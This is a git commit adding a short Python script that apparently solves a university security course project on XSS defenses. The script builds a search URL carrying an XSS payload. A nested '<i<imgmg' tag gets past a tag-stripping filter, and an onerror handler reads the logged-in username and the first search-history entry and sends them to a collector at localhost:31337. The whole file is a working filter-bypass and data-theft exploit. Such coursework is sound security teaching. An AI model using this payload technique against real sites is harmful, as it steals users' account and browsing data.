176803d5f6f87986f4749c8cfbba5d9de6d3a3d4
zachroyer <zach.royer14@gmail.com>
2025-04-16 16:10:14 -0600

    Implemented filtering for XSS defense 2.

---
+++ xss2-builder.py
@@ -0,0 +1,13 @@
+import urllib.parse
+
+url_RAW = "https://cs4440.eng.utah.edu/project3/search?q="
+xss = "&xssdefense=2"
+
+script = '''
+<i<imgmg src=x
+onerror="username = document.getElementById('logged-in-user').innerHTML;firstSearch = document.getElementById('history-list').children[0].innerHTML;$.get('https://localhost:31337/',%7Bstolen_user: username,first_search: firstSearch});">
+'''
+encoded = urllib.parse.quote(script)
+final_url = url_RAW + encoded + xss
+
+print(final_url)
